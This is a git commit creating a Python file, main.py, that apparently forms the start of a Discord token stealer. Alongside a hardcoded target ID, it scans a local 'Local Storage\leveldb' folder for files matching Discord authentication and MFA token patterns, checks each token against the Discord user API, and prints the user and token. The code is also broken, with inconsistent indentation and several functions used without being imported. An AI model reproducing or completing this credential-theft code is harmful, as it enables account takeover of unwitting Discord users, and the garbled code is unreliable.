f678414537f82a2ca33c8e40eabe4dd8da2df2eb
RobbedZK <82470358+RobbedZK@users.noreply.github.com>
2021-04-15 21:57:52 +0100

    Create main.py

---
+++ main.py
@@ -0,0 +1,52 @@
+import discord
+import random
+import threading
+from threading import Thread
+import string
+import urllib3
+urllib3.disable_warnings()
+import asyncio
+import colorama
+from colorama import Fore, Style, Back
+import time
+from time import sleep
+colorama.init()
+class targetid():
+  targetid = "802961643490770954"
+
+
+target = discord.Client()
+
+
+x = {} # USER ID 
+
+y = {} # USER TOKEN
+
+def getheaders(token=None, content_type="application/json"):
+            headers = {
+                "Content-Type": content_type,
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+            }
+            if token:
+                headers.update({"Authorization": token})
+            return headers
+        def getuserdata(token):
+            try:
+                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+            except:
+                pass
+        def gettokens(path):
+            path += "\\Local Storage\\leveldb"
+            tokens = []
+            for file_name in os.listdir(path):
+                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+                    continue
+                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                        for token in findall(regex, line):
+                            tokens.append(token)
+            return tokens
+
+
+def on_connect():
+  print(f'User: {x} | Token: {y}')
